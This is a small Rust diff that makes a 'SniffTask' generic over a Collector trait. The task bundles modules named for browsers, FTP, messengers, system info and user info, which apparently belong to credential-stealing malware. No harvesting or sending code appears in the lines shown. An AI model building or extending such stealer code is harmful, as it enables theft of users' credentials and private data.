@@ -15,15 +15,16 @@ use crate::systeminfo::SystemInfoTask;
 use crate::userinfo::UserInfoTask;
 use alloc::vec;
 use browsers::BrowsersTask;
+use collector::Collector;
 use ftp::FtpTask;
 use messengers::MessengersTask;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
 
-pub struct SniffTask {
-    inner: CompositeTask
+pub struct SniffTask<C: Collector> {
+    inner: CompositeTask<C>
 }
 
-impl SniffTask {
+impl<C: Collector + 'static> SniffTask<C> {
     pub fn new() -> Self {
         Self {
             inner: composite_task!(
@@ -40,4 +41,4 @@ impl SniffTask {
     }
 }
 
-impl_composite_task_runner!(SniffTask);
+impl_composite_task_runner!(SniffTask<C>);
